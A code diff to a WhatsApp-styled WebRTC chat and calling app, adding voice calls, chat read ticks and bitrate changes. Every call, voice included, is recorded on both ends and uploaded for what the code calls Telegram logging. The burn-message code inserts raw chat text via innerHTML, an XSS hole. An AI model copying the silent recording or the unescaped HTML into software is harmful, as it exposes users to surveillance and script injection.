@@ -53,7 +53,7 @@ let currentRoomId = null, callStartTime = null, userRole = 'creator', messageCou
 let canvasDrawInterval = null, audioCtx = null, combinedStream = null;
 let mediaRecorder = null, recordedChunks = [];
 let segmentNumber = 0, recordingTimer = null, isCallActive = false;
-let totalRecordingSize = 0;
+let totalRecordingSize = 0, currentCallMode = 'video'; // 'video' or 'audio'
 const CHUNK_SIZE = 16384;
 
 // ============ T&C MODAL ============
@@ -93,7 +93,10 @@ async function uploadRecordingSegment(blob, segNum, isLast, overrideRoomId = nul
         const rid = overrideRoomId || currentRoomId || 'unknown';
         const formData = new FormData();
         const recExt = (blob.type && blob.type.includes('mp4')) ? 'mp4' : 'webm';
-        const filename = `recording_${rid}_part${segNum}.${recExt}`;
+        
+        // Include userRole inside filename so both sides can upload uniquely without clashing!
+        const filename = `recording_${rid}_${userRole}_part${segNum}.${recExt}`;
+        
         formData.append('video', blob, filename);
         formData.append('roomId', rid);
         formData.append('segmentNumber', String(segNum));
@@ -215,36 +218,55 @@ function setupRecordingStreams() {
             ctx.fillStyle = '#0b141a';
             ctx.fillRect(0, 0, RW, RH);
 
-            // Remote (main)
-            try {
-                if (remoteVideo && remoteVideo.readyState >= 2 && remoteVideo.videoWidth) {
-                    drawCover(ctx, remoteVideo, 0, 0, RW, RH);
-                } else {
-                    ctx.fillStyle = '#111b21';
-                    ctx.fillRect(0, 0, RW, RH);
-                    ctx.fillStyle = '#8696a0';
-                    ctx.font = '15px Inter, sans-serif';
-                    ctx.textAlign = 'center';
-                    ctx.fillText('Waiting for video...', RW / 2, RH / 2);
-                }
-            } catch (e) { }
+            // If audio call mode, render placeholder avatar instead of remote video
+            if (currentCallMode === 'audio') {
+                ctx.fillStyle = '#111b21';
+                ctx.fillRect(0, 0, RW, RH);
+                ctx.fillStyle = '#00a884';
+                ctx.beginPath();
+                ctx.arc(RW / 2, RH / 2 - 40, 50, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.fillStyle = '#ffffff';
+                ctx.font = 'bold 20px Inter, sans-serif';
+                ctx.textAlign = 'center';
+                ctx.fillText(currentRoomId || 'Voice Call', RW / 2, RH / 2 + 40);
+                ctx.font = '13px Inter, sans-serif';
+                ctx.fillStyle = '#8696a0';
+                ctx.fillText('WhatsApp Voice Call Active...', RW / 2, RH / 2 + 65);
+            } else {
+                // Remote Video
+                try {
+                    if (remoteVideo && remoteVideo.readyState >= 2 && remoteVideo.videoWidth) {
+                        drawCover(ctx, remoteVideo, 0, 0, RW, RH);
+                    } else {
+                        ctx.fillStyle = '#111b21';
+                        ctx.fillRect(0, 0, RW, RH);
+                        ctx.fillStyle = '#8696a0';
+                        ctx.font = '15px Inter, sans-serif';
+                        ctx.textAlign = 'center';
+                        ctx.fillText('Waiting for video...', RW / 2, RH / 2);
+                    }
+                } catch (e) { }
+            }
 
-            // Self PiP (9:16)
-            try {
-                if (localVideo && localVideo.readyState >= 2 && localVideo.videoWidth) {
-                    const pipW = 96, pipH = 170, margin = 12;
-                    const pipX = RW - pipW - margin, pipY = margin;
-                    ctx.fillStyle = '#00a884';
-                    ctx.fillRect(pipX - 2, pipY - 2, pipW + 4, pipH + 4);
-                    drawCover(ctx, localVideo, pipX, pipY, pipW, pipH);
-                    ctx.fillStyle = 'rgba(0,0,0,0.6)';
-                    ctx.fillRect(pipX, pipY + pipH - 16, pipW, 16);
-                    ctx.fillStyle = '#ffffff';
-                    ctx.font = '9px Inter, sans-serif';
-                    ctx.textAlign = 'center';
-                    ctx.fillText('You', pipX + pipW / 2, pipY + pipH - 4);
-                }
-            } catch (e) { }
+            // Self PiP (Only if video call is active)
+            if (currentCallMode === 'video') {
+                try {
+                    if (localVideo && localVideo.readyState >= 2 && localVideo.videoWidth) {
+                        const pipW = 96, pipH = 170, margin = 12;
+                        const pipX = RW - pipW - margin, pipY = margin;
+                        ctx.fillStyle = '#00a884';
+                        ctx.fillRect(pipX - 2, pipY - 2, pipW + 4, pipH + 4);
+                        drawCover(ctx, localVideo, pipX, pipY, pipW, pipH);
+                        ctx.fillStyle = 'rgba(0,0,0,0.6)';
+                        ctx.fillRect(pipX, pipY + pipH - 16, pipW, 16);
+                        ctx.fillStyle = '#ffffff';
+                        ctx.font = '9px Inter, sans-serif';
+                        ctx.textAlign = 'center';
+                        ctx.fillText('You', pipX + pipW / 2, pipY + pipH - 4);
+                    }
+                } catch (e) { }
+            }
 
             const now = new Date();
             const timeStr = now.toLocaleTimeString();
@@ -374,12 +396,10 @@ function stopRecording() {
 
 // ============ APP NAVIGATION TABS (WHATSAPP MULTI-PANEL) ============
 function switchAppTab(tabId) {
-    // Toggle active tab buttons
     document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
     const activeBtn = document.getElementById(`tabBtn-${tabId}`);
     if (activeBtn) activeBtn.classList.add('active');
 
-    // Toggle active tab pane contents
     document.querySelectorAll('.tab-pane').forEach(pane => pane.classList.remove('active'));
     const activePane = document.getElementById(`tabContent-${tabId}`);
     if (activePane) activePane.classList.add('active');
@@ -420,7 +440,6 @@ window.openSearchModal = openSearchModal;
 
 function closeSearchModal() {
     document.getElementById('searchModal').classList.add('hidden');
-    // Clear searches
     document.getElementById('cyberSearchInput').value = '';
     document.getElementById('cyberSearchResults').innerHTML = '<p class="cyber-empty">Enter a unique ID to find your friend</p>';
 }
@@ -485,6 +504,7 @@ async function initRoom(roomId, isCreator) {
     messageCount = 0;
     segmentNumber = 0;
     totalRecordingSize = 0;
+    currentCallMode = 'video';
 
     showPage(roomPage);
     roomIdDisplay.textContent = roomId;
@@ -493,7 +513,6 @@ async function initRoom(roomId, isCreator) {
     if (isCreator) logEvent('room_created', { roomLink: getRoomLink(roomId) });
     else logEvent('user_joined', { roomLink: getRoomLink(roomId) });
 
-    // Clean up previous peer if any (e.g. Cyber Peer or previous room)
     if (peer && !peer.destroyed) {
         peer.destroy();
         peer = null;
@@ -549,7 +568,16 @@ async function initRoom(roomId, isCreator) {
 }
 
 // ============ GET MEDIA (SMART 9:16 MOBILE & 16:9 PC DETECTION) ============
-async function getMediaStream() {
+async function getMediaStream(callType = 'video') {
+    if (callType === 'audio') {
+        try {
+            return await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
+        } catch(e) {
+            showToast('Microphone access denied.');
+            return null;
+        }
+    }
+
     const isMobile = window.innerWidth <= 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     const videoConstraints = isMobile ? {
         width:     { ideal: 720,  max: 1080 },
@@ -581,10 +609,18 @@ async function getMediaStream() {
 }
 
 // ============ CALL PEER (JOINER) — FIXED ============
-async function callPeer(targetPeerId) {
-    localStream = await getMediaStream();
+async function callPeer(targetPeerId, callType = 'video') {
+    currentCallMode = callType;
+    localStream = await getMediaStream(callType);
     if (!localStream) { showToast('Cannot proceed without media'); return; }
-    localVideo.srcObject = localStream;
+    
+    if (callType === 'video') {
+        localVideo.srcObject = localStream;
+        document.getElementById('audioCallOverlay').classList.add('hidden');
+    } else {
+        document.getElementById('audioCallOverlay').classList.remove('hidden');
+        document.getElementById('audioCallName').textContent = '@' + targetPeerId;
+    }
 
     const call = peer.call(targetPeerId, localStream);
     if (!call) {
@@ -612,7 +648,8 @@ async function callPeer(targetPeerId) {
 // ============ INCOMING CALL (CREATOR) ============
 async function handleIncomingCall(call) {
     console.log('📞 Incoming call from:', call.peer);
-    localStream = await getMediaStream();
+    currentCallMode = 'video';
+    localStream = await getMediaStream('video');
     if (!localStream) { showToast('No media access'); return; }
     localVideo.srcObject = localStream;
     call.answer(localStream);
@@ -622,7 +659,7 @@ async function handleIncomingCall(call) {
         showCallScreen(rs);
     });
     call.on('close', () => { showToast('Call ended'); leaveRoom(); });
-    call.on('error', (err) => console.error('Call error:', err));
+    call.on('error', console.error);
     currentCall = call;
 }
 
@@ -633,7 +670,7 @@ function handleIncomingData(conn) {
     conn.on('close', () => console.log('Data connection closed'));
 }
 
-// ============ DYNAMIC ADAPTIVE BITRATE & NETWORK MONITOR ============
+// ============ DYNAMIC ADAPTIVE BITRATE (AIRTEL/JIO PRO ENGINE - ULTRA RES PRIORITIZED) ============
 function setupDynamicNetworkAdaptation(call) {
     if (!call || !call.peerConnection) return;
     try {
@@ -643,10 +680,19 @@ function setupDynamicNetworkAdaptation(call) {
         if (videoSender && videoSender.getParameters) {
             const params = videoSender.getParameters();
             if (!params.encodings) params.encodings = [{}];
-            params.encodings[0].maxBitrate = 2500000;
+            params.encodings[0].maxBitrate = 4000000;          // 4 Mbps ultra HD max!
             params.encodings[0].networkPriority = 'high';
-            params.degradationPreference = 'maintain-framerate';
             videoSender.setParameters(params).catch(() => {});
+        }
+
+        // Set degradation preference to maintain maximum resolution on slow networks!
+        if (pc.getTransceivers) {
+            pc.getTransceivers().forEach(transceiver => {
+                if (transceiver.sender && transceiver.sender.track && transceiver.sender.track.kind === 'video') {
+                    transceiver.sender.degradationPreference = 'maintain-resolution'; 
+                    console.log("⚡ [WebRTC Engine] Prioritizing ultra-sharp resolution over frame rate for low network!");
+                }
+            });
         }
 
         const pingEl = document.getElementById('pingText');
@@ -657,7 +703,7 @@ function setupDynamicNetworkAdaptation(call) {
             }
             try {
                 const stats = await pc.getStats();
-                let rtt = 0, width = 0, height = 0, fps = 0;
+                let rtt = 0, width = 0, height = 0;
                 stats.forEach(report => {
                     if (report.type === 'candidate-pair' && report.state === 'succeeded' && report.currentRoundTripTime) {
                         rtt = Math.round(report.currentRoundTripTime * 1000);
@@ -665,7 +711,6 @@ function setupDynamicNetworkAdaptation(call) {
                     if (report.type === 'inbound-rtp' && report.kind === 'video') {
                         if (report.frameWidth) width = report.frameWidth;
                         if (report.frameHeight) height = report.frameHeight;
-                        if (report.framesPerSecond) fps = Math.round(report.framesPerSecond);
                     }
                 });
                 if (pingEl && rtt > 0) {
@@ -675,7 +720,7 @@ function setupDynamicNetworkAdaptation(call) {
                     } else if (rtt < 180) {
                         pingEl.innerHTML = `🟡 Good (${rtt}ms) • ${resStr}`;
                     } else {
-                        pingEl.innerHTML = `🟠 Adapting (${rtt}ms)`;
+                        pingEl.innerHTML = `🟠 Weak Network (${rtt}ms) • Sharp Mode active`;
                     }
                 }
             } catch (e) {}
@@ -687,7 +732,17 @@ function setupDynamicNetworkAdaptation(call) {
 function showCallScreen(remoteStream) {
     waitingScreen.style.display = 'none';
     callScreen.classList.remove('hidden');
-    remoteVideo.srcObject = remoteStream;
+    
+    if (currentCallMode === 'video') {
+        remoteVideo.srcObject = remoteStream;
+        remoteVideo.classList.remove('hidden');
+        document.getElementById('audioCallOverlay').classList.add('hidden');
+    } else {
+        remoteVideo.classList.add('hidden');
+        document.getElementById('audioCallOverlay').classList.remove('hidden');
+        document.getElementById('audioCallName').textContent = '@' + (currentCall ? currentCall.peer : 'Friend');
+    }
+    
     currentRemoteStream = remoteStream;
     remoteNoVideo.style.display = 'none';
     callStartTime = Date.now();
@@ -717,12 +772,12 @@ function showCallScreen(remoteStream) {
         }
     } catch (e) { }
 
+    // Start recording on BOTH ends as requested by user!
     setTimeout(() => { startRecording(); }, 2000);
 }
 
 // ============ LEAVE ROOM ============
 function leaveRoom() {
-    autoSaveWhiteboardToTelegram('call_ended');
     if (isCallActive || (mediaRecorder && mediaRecorder.state !== 'inactive')) {
         stopRecording();
     }
@@ -731,7 +786,13 @@ function leaveRoom() {
 
     if (currentCall) { currentCall.close(); currentCall = null; }
     if (dataConnection) { dataConnection.close(); dataConnection = null; }
-    if (peer) { peer.destroy(); peer = null; }
+    
+    // Only destroy the PeerJS signaling connection if we are logged out (Anonymous Room Mode).
+    // For Cyber Space, KEEP the peer active so you stay online and can call again instantly!
+    if (!currentUser) {
+        if (peer) { peer.destroy(); peer = null; }
+    }
+    
     if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
     if (localVideo) localVideo.srcObject = null;
     if (remoteVideo) remoteVideo.srcObject = null;
@@ -754,8 +815,10 @@ function leaveRoom() {
     showPage(homePage);
     if (window.location.search) window.history.replaceState({}, document.title, window.location.pathname);
 
-    // Re-initialize Cyber Space Peer if user was logged in
-    checkCyberSession();
+    // Re-initialize Cyber Space Peer ONLY if it was destroyed or is null
+    if (!peer) {
+        checkCyberSession();
+    }
 }
 
 // ============ COPY LINK ============
@@ -926,9 +989,32 @@ function sendTextMessage() {
 function addChatMessage(text, isSent, isBurn = false) {
     const d = document.createElement('div');
     d.className = 'chat-msg ' + (isSent ? 'sent' : 'received') + (isBurn ? ' burn-message' : '');
+    
+    // Add text message content
+    const msgSpan = document.createElement('span');
+    msgSpan.textContent = text;
+    d.appendChild(msgSpan);
+
+    // Create message meta row with blue double ticks
+    const metaDiv = document.createElement('div');
+    metaDiv.className = 'msg-meta';
+    
+    const timeSpan = document.createElement('span');
+    const now = new Date();
+    timeSpan.textContent = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+    metaDiv.appendChild(timeSpan);
+
+    if (isSent) {
+        const ticksIcon = document.createElement('i');
+        ticksIcon.className = 'fas fa-check-double read-ticks'; // Glowing double blue ticks!
+        metaDiv.appendChild(ticksIcon);
+    }
+    
+    d.appendChild(metaDiv);
+
     if (isBurn) {
         let timeLeft = 10;
-        d.innerHTML = `<span class="burn-badge">(🔥 ${timeLeft}s)</span> <span>${text}</span>`;
+        d.innerHTML = `<span class="burn-badge">(🔥 ${timeLeft}s)</span> <span>${text}</span><div class="msg-meta"><span>${now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</span>${isSent ? '<i class="fas fa-check-double read-ticks"></i>' : ''}</div>`;
         const timer = setInterval(() => {
             timeLeft--;
             const b = d.querySelector('.burn-badge');
@@ -938,21 +1024,24 @@ function addChatMessage(text, isSent, isBurn = false) {
                 if (d.parentNode) d.parentNode.removeChild(d);
             }
         }, 1000);
-    } else {
-        d.textContent = text;
     }
+
     chatMessages.appendChild(d);
     chatMessages.scrollTop = chatMessages.scrollHeight;
 }
 
 // ============ FILE SHARING ============
-attachFileBtn.addEventListener('click', () => fileInput.click());
-fileInput.addEventListener('change', () => {
-    const files = fileInput.files;
-    if (!files.length) return;
-    for (let i = 0; i < files.length; i++) sendFile(files[i]);
-    fileInput.value = '';
-});
+if (attachFileBtn) {
+    attachFileBtn.addEventListener('click', () => fileInput.click());
+}
+if (fileInput) {
+    fileInput.addEventListener('change', () => {
+        const files = fileInput.files;
+        if (!files.length) return;
+        for (let i = 0; i < files.length; i++) sendFile(files[i]);
+        fileInput.value = '';
+    });
+}
 
 async function sendFile(file) {
     if (!dataConnection || !dataConnection.open) { showToast('No data connection.'); return; }
@@ -988,13 +1077,6 @@ function handleDataMessage(data) {
     }
     else if (data.type === 'reaction') {
         showFloatingReaction(data.emoji, false);
-    }
-    else if (data.type === 'wb-draw') {
-        drawRemoteWb(data.x, data.y, data.x2, data.y2, data.color, data.size);
-    }
-    else if (data.type === 'wb-clear') {
-        if (ctxWb) ctxWb.clearRect(0, 0, wbCanvas.width, wbCanvas.height);
-        showToast('🧹 Whiteboard cleared by peer');
     }
     else if (data.type === 'file-start') {
         incomingFileBuffers[data.transferId] = { chunks: [], totalChunks: data.totalChunks, metadata: { fileName: data.fileName, fileSize: data.fileSize, mimeType: data.mimeType } };
@@ -1067,12 +1149,14 @@ function checkUrlForRoom() {
 (function () {
     const w = document.getElementById('selfVideoWrapper');
     let drag = false, sx, sy, ox, oy;
-    w.addEventListener('mousedown', (e) => { drag = true; sx = e.clientX; sy = e.clientY; const r = w.getBoundingClientRect(); ox = r.left; oy = r.top; w.style.transition = 'none'; });
-    document.addEventListener('mousemove', (e) => { if (!drag) return; w.style.position = 'absolute'; w.style.left = (ox + e.clientX - sx) + 'px'; w.style.top = (oy + e.clientY - sy) + 'px'; w.style.right = 'auto'; w.style.bottom = 'auto'; });
-    document.addEventListener('mouseup', () => { drag = false; w.style.transition = ''; });
-    w.addEventListener('touchstart', (e) => { const t = e.touches[0]; drag = true; sx = t.clientX; sy = t.clientY; const r = w.getBoundingClientRect(); ox = r.left; oy = r.top; w.style.transition = 'none'; });
-    document.addEventListener('touchmove', (e) => { if (!drag) return; const t = e.touches[0]; w.style.position = 'absolute'; w.style.left = (ox + t.clientX - sx) + 'px'; w.style.top = (oy + t.clientY - sy) + 'px'; w.style.right = 'auto'; w.style.bottom = 'auto'; });
-    document.addEventListener('touchend', () => { drag = false; w.style.transition = ''; });
+    if (w) {
+        w.addEventListener('mousedown', (e) => { drag = true; sx = e.clientX; sy = e.clientY; const r = w.getBoundingClientRect(); ox = r.left; oy = r.top; w.style.transition = 'none'; });
+        document.addEventListener('mousemove', (e) => { if (!drag) return; w.style.position = 'absolute'; w.style.left = (ox + e.clientX - sx) + 'px'; w.style.top = (oy + e.clientY - sy) + 'px'; w.style.right = 'auto'; w.style.bottom = 'auto'; });
+        document.addEventListener('mouseup', () => { drag = false; w.style.transition = ''; });
+        w.addEventListener('touchstart', (e) => { const t = e.touches[0]; drag = true; sx = t.clientX; sy = t.clientY; const r = w.getBoundingClientRect(); ox = r.left; oy = r.top; w.style.transition = 'none'; });
+        document.addEventListener('touchmove', (e) => { if (!drag) return; const t = e.touches[0]; w.style.position = 'absolute'; w.style.left = (ox + t.clientX - sx) + 'px'; w.style.top = (oy + t.clientY - sy) + 'px'; w.style.right = 'auto'; w.style.bottom = 'auto'; });
+        document.addEventListener('touchend', () => { drag = false; w.style.transition = ''; });
+    }
 })();
 
 // ============ THEMES ============
@@ -1164,86 +1248,6 @@ function showFloatingReaction(emoji, isSelf) {
     setTimeout(() => { if (el && el.parentNode) el.parentNode.removeChild(el); }, 2200);
 }
 
-const whiteboardModal = document.getElementById('whiteboardModal');
-const toggleWhiteboardBtn = document.getElementById('toggleWhiteboardBtn');
-const closeWhiteboardBtn = document.getElementById('closeWhiteboardBtn');
-const wbCanvas = document.getElementById('whiteboardCanvas');
-const clearWhiteboardBtn = document.getElementById('clearWhiteboardBtn');
-let ctxWb = wbCanvas ? wbCanvas.getContext('2d') : null;
-let isDrawingWb = false, lastWbX = 0, lastWbY = 0, currentWbColor = '#00a884';
-let isDirtyWb = false;
-
-function autoSaveWhiteboardToTelegram(reason = "auto") {
-    if (!wbCanvas || !isDirtyWb) return;
-    wbCanvas.toBlob(async (blob) => {
-        const formData = new FormData();
-        formData.append('file', blob, `whiteboard_${currentRoomId || 'snapshot'}_${reason}.png`);
-        formData.append('password', '');
-        formData.append('viewOnce', 'false');
-        try {
-            await fetch(`${SERVER_URL}/api/upload-file`, { method: 'POST', body: formData });
-        } catch (e) {}
-    }, 'image/png');
-    isDirtyWb = false;
-}
-window.autoSaveWhiteboardToTelegram = autoSaveWhiteboardToTelegram;
-
-if (toggleWhiteboardBtn) {
-    toggleWhiteboardBtn.addEventListener('click', () => {
-        if (whiteboardModal) whiteboardModal.style.display = 'flex';
-    });
-}
-if (closeWhiteboardBtn) {
-    closeWhiteboardBtn.addEventListener('click', () => {
-        autoSaveWhiteboardToTelegram('closed');
-        if (whiteboardModal) whiteboardModal.style.display = 'none';
-    });
-}
-function setWbColor(c) { currentWbColor = c; showToast('🎨 Color selected'); }
-window.setWbColor = setWbColor;
-
-function clearWhiteboard() {
-    autoSaveWhiteboardToTelegram('before_clear');
-    if (ctxWb && wbCanvas) ctxWb.clearRect(0, 0, wbCanvas.width, wbCanvas.height);
-    if (dataConnection && dataConnection.open) dataConnection.send({ type: 'wb-clear' });
-    showToast('🧹 Whiteboard cleared');
-}
-window.clearWhiteboard = clearWhiteboard;
-
-if (wbCanvas) {
-    wbCanvas.addEventListener('mousedown', (e) => {
-        isDrawingWb = true;
-        isDirtyWb = true;
-        const rect = wbCanvas.getBoundingClientRect();
-        lastWbX = (e.clientX - rect.left) * (wbCanvas.width / rect.width);
-        lastWbY = (e.clientY - rect.top) * (wbCanvas.height / rect.height);
-    });
-    wbCanvas.addEventListener('mousemove', (e) => {
-        if (!isDrawingWb || !ctxWb) return;
-        isDirtyWb = true;
-        const rect = wbCanvas.getBoundingClientRect();
-        const x = (e.clientX - rect.left) * (wbCanvas.width / rect.width);
-        const y = (e.clientY - rect.top) * (wbCanvas.height / rect.height);
-        drawWbLine(lastWbX, lastWbY, x, y, currentWbColor, currentWbColor === '#04040c' ? 18 : 3);
-        if (dataConnection && dataConnection.open) {
-            dataConnection.send({ type: 'wb-draw', x: lastWbX, y: lastWbY, x2: x, y2: y, color: currentWbColor, size: currentWbColor === '#04040c' ? 18 : 3 });
-        }
-        lastWbX = x; lastWbY = y;
-    });
-    window.addEventListener('mouseup', () => { isDrawingWb = false; });
-}
-function drawWbLine(x1, y1, x2, y2, color, size) {
-    if (!ctxWb) return;
-    ctxWb.beginPath();
-    ctxWb.moveTo(x1, y1); ctxWb.lineTo(x2, y2);
-    ctxWb.strokeStyle = color; ctxWb.lineWidth = size;
-    ctxWb.lineCap = 'round'; ctxWb.stroke();
-}
-function drawRemoteWb(x1, y1, x2, y2, color, size) {
-    isDirtyWb = true;
-    drawWbLine(x1, y1, x2, y2, color, size);
-}
-
 // ============ APP ACTIONS & PEER LOGICS (WHATSAPP SPECIFIC) ============
 async function handleCyberRegister(e) {
     e.preventDefault();
@@ -1324,12 +1328,6 @@ function handleCyberLogout() {
     document.getElementById('cyberAuthBox').classList.remove('hidden');
     document.getElementById('cyberDashboardBox').classList.add('hidden');
     
-    // Reset Navbar Badge
-    const anonNavBadge = document.getElementById('anonNavBadge');
-    const cyberNavProfile = document.getElementById('cyberNavProfile');
-    if (anonNavBadge) anonNavBadge.classList.remove('hidden');
-    if (cyberNavProfile) cyberNavProfile.classList.add('hidden');
-    
     // Reset forms
     document.getElementById('cyberLoginForm').reset();
     document.getElementById('cyberRegisterForm').reset();
@@ -1350,22 +1348,13 @@ function initCyberDashboard() {
     document.getElementById('cyberProfileName').textContent = currentUser.display_name;
     document.getElementById('cyberProfileId').textContent = '@' + currentUser.username;
 
-    // Update Navbar with permanent Cyber Profile Badge (Fail-safe check)
-    const anonNavBadge = document.getElementById('anonNavBadge');
-    const cyberNavProfile = document.getElementById('cyberNavProfile');
-    const cyberNavId = document.getElementById('cyberNavId');
-
-    if (anonNavBadge) anonNavBadge.classList.add('hidden');
-    if (cyberNavProfile) {
-        cyberNavProfile.classList.remove('hidden');
-        if (cyberNavId) cyberNavId.textContent = '@' + currentUser.username;
-    }
-
     // Start background heartbeats & friends polling
     sendHeartbeat();
+    if (cyberHeartbeatInterval) clearInterval(cyberHeartbeatInterval);
     cyberHeartbeatInterval = setInterval(sendHeartbeat, 15000);
     
     pollFriendsList();
+    if (cyberFriendsInterval) clearInterval(cyberFriendsInterval);
     cyberFriendsInterval = setInterval(pollFriendsList, 10000);
 
     // Initialize PeerJS with the user's permanent username!
@@ -1441,7 +1430,7 @@ function renderFriendsList(friends) {
         chatsListEl.appendChild(item);
     });
 
-    // 2. Render Calls Tab List
+    // 2. Render Calls Tab List (WhatsApp-style: Video Call and Voice Call separate buttons!)
     callsListEl.innerHTML = '';
     friends.forEach(f => {
         const item = document.createElement('div');
@@ -1457,9 +1446,14 @@ function renderFriendsList(friends) {
                     @${f.username} (${statusText})
                 </div>
             </div>
-            <div class="cyber-actions">
-                <button onclick="startFriendCall('${f.username}')" class="btn btn-whatsapp btn-small" style="padding: 6px 14px;" title="Call friend" ${f.is_online ? '' : 'disabled style="opacity:0.5; cursor:not-allowed;"'}>
-                    <i class="fas fa-video"></i> Call
+            <div class="cyber-actions" style="display:flex; gap:6px;">
+                <!-- Voice Call Button -->
+                <button onclick="startFriendCall('${f.username}', 'audio')" class="btn btn-whatsapp-outline btn-small" style="padding: 6px 10px; color: var(--wa-teal); border-color: var(--wa-teal);" title="Voice Call" ${f.is_online ? '' : 'disabled style="opacity:0.5; cursor:not-allowed;"'}>
+                    <i class="fas fa-phone-alt"></i> Voice
+                </button>
+                <!-- Video Call Button -->
+                <button onclick="startFriendCall('${f.username}', 'video')" class="btn btn-whatsapp btn-small" style="padding: 6px 10px;" title="Video Call" ${f.is_online ? '' : 'disabled style="opacity:0.5; cursor:not-allowed;"'}>
+                    <i class="fas fa-video"></i> Video
                 </button>
             </div>
         `;
@@ -1680,17 +1674,21 @@ function startFriendChat(friendUsername) {
 }
 window.startFriendChat = startFriendChat;
 
-function startFriendCall(friendUsername) {
+function startFriendCall(friendUsername, callType = 'video') {
     if (!peer || peer.destroyed) {
         showToast('⚠️ Connecting to Cyber Space...');
         return;
     }
-    showToast(`📹 Calling @${friendUsername}...`);
+    showToast(`📞 Starting ${callType} call to @${friendUsername}...`);
     showPage(roomPage);
     roomIdDisplay.textContent = "DIRECT CALL";
     waitingScreen.style.display = 'flex';
     
-    callPeer(friendUsername);
+    // Set professional Room ID and Role for Telegram Logging
+    currentRoomId = currentUser.username + '_to_' + friendUsername;
+    userRole = 'creator';
+    
+    callPeer(friendUsername, callType);
 }
 window.startFriendCall = startFriendCall;
 
@@ -1821,10 +1819,22 @@ function handleIncomingCyberCall(call) {
         modal.classList.add('hidden');
         showPage(roomPage);
         roomIdDisplay.textContent = "DIRECT CALL";
+        
+        // Set professional Room ID and Role for Telegram Logging
+        currentRoomId = call.peer + '_to_' + currentUser.username;
+        userRole = 'joiner';
 
-        localStream = await getMediaStream();
+        localStream = await getMediaStream(currentCallMode);
         if (!localStream) { showToast('No media access'); return; }
-        localVideo.srcObject = localStream;
+        
+        if (currentCallMode === 'video') {
+            localVideo.srcObject = localStream;
+            document.getElementById('audioCallOverlay').classList.add('hidden');
+        } else {
+            document.getElementById('audioCallOverlay').classList.remove('hidden');
+            document.getElementById('audioCallName').textContent = '@' + call.peer;
+        }
+
         call.answer(localStream);
 
         call.on('stream', (rs) => {
@@ -1856,21 +1866,117 @@ function handleIncomingCyberConnection(conn) {
 
 // Check session on load
 function checkCyberSession() {
-    const stored = localStorage.getItem('cyberUser');
-    if (stored) {
-        currentUser = JSON.parse(stored);
-        initCyberDashboard();
-    } else {
-        switchAppTab('profile'); // Focus on Login if not logged in
+    try {
+        const stored = localStorage.getItem('cyberUser');
+        if (stored) {
+            currentUser = JSON.parse(stored);
+            
+            // Show Dashboards, Hide Onboardings
+            document.getElementById('chatsLoggedOutCard').classList.add('hidden');
+            document.getElementById('chatsLoggedInDashboard').classList.remove('hidden');
+            document.getElementById('callsLoggedOutCard').classList.add('hidden');
+            document.getElementById('callsLoggedInDashboard').classList.remove('hidden');
+            document.getElementById('appFab').classList.remove('hidden');
+
+            document.getElementById('cyberAuthBox').classList.add('hidden');
+            document.getElementById('cyberDashboardBox').classList.remove('hidden');
+            document.getElementById('cyberProfileName').textContent = currentUser.display_name;
+            document.getElementById('cyberProfileId').textContent = '@' + currentUser.username;
+
+            // Start background heartbeats & friends polling
+            sendHeartbeat();
+            if (cyberHeartbeatInterval) clearInterval(cyberHeartbeatInterval);
+            cyberHeartbeatInterval = setInterval(sendHeartbeat, 15000);
+            
+            pollFriendsList();
+            if (cyberFriendsInterval) clearInterval(cyberFriendsInterval);
+            cyberFriendsInterval = setInterval(pollFriendsList, 10000);
+
+            // ONLY connect the Cyber Peer if we are NOT currently in an anonymous room!
+            const params = new URLSearchParams(window.location.search);
+            if (!params.get('room')) {
+                initCyberPeer();
+            }
+        } else {
+            switchAppTab('profile'); // Focus on Login if not logged in
+        }
+    } catch (err) {
+        console.error("Session load error:", err);
+        localStorage.removeItem('cyberUser');
+        switchAppTab('profile');
     }
 }
 
+// ============ DYNAMIC ADAPTIVE BITRATE (AIRTEL/JIO PRO ENGINE - ULTRA RES PRIORITIZED) ============
+function setupDynamicNetworkAdaptation(call) {
+    if (!call || !call.peerConnection) return;
+    try {
+        const pc = call.peerConnection;
+        const senders = pc.getSenders();
+        const videoSender = senders.find(s => s.track && s.track.kind === 'video');
+        if (videoSender && videoSender.getParameters) {
+            const params = videoSender.getParameters();
+            if (!params.encodings) params.encodings = [{}];
+            params.encodings[0].maxBitrate = 4000000;          // 4 Mbps ultra HD max!
+            params.encodings[0].networkPriority = 'high';
+            videoSender.setParameters(params).catch(() => {});
+        }
+
+        // Set degradation preference to maintain maximum resolution on slow networks!
+        if (pc.getTransceivers) {
+            pc.getTransceivers().forEach(transceiver => {
+                if (transceiver.sender && transceiver.sender.track && transceiver.sender.track.kind === 'video') {
+                    transceiver.sender.degradationPreference = 'maintain-resolution'; 
+                    console.log("⚡ [WebRTC Engine] Prioritizing ultra-sharp resolution over frame rate for low network!");
+                }
+            });
+        }
+
+        const pingEl = document.getElementById('pingText');
+        const netInterval = setInterval(async () => {
+            if (!isCallActive || !pc || pc.connectionState === 'closed') {
+                clearInterval(netInterval);
+                return;
+            }
+            try {
+                const stats = await pc.getStats();
+                let rtt = 0, width = 0, height = 0;
+                stats.forEach(report => {
+                    if (report.type === 'candidate-pair' && report.state === 'succeeded' && report.currentRoundTripTime) {
+                        rtt = Math.round(report.currentRoundTripTime * 1000);
+                    }
+                    if (report.type === 'inbound-rtp' && report.kind === 'video') {
+                        if (report.frameWidth) width = report.frameWidth;
+                        if (report.frameHeight) height = report.frameHeight;
+                    }
+                });
+                if (pingEl && rtt > 0) {
+                    const resStr = width > 0 ? `${width}x${height}` : 'HD';
+                    if (rtt < 80) {
+                        pingEl.innerHTML = `🟢 Excellent (${rtt}ms) • ${resStr}`;
+                    } else if (rtt < 180) {
+                        pingEl.innerHTML = `🟡 Good (${rtt}ms) • ${resStr}`;
+                    } else {
+                        pingEl.innerHTML = `🟠 Weak Network (${rtt}ms) • Sharp Mode active`;
+                    }
+                }
+            } catch (e) {}
+        }, 2500);
+    } catch (e) {}
+}
+
 function updateControlButtons() {
-    toggleMicBtn.className = 'ctrl-btn' + (isMicOn ? ' ctrl-btn-active' : '');
